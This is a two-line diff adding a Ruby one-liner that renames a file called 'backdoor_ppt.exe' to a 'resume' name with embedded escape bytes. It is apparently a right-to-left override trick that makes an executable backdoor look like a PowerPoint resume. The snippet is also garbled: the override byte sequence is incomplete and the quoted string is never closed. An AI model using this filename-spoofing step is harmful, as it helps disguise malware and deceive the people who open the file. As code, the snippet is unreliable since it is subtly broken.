@@ -1,0 +1,2 @@
+# Rename executable to ppt
+ruby -e 'File.rename("backdoor_ppt.exe", "resume\x80\xaettp.exe")
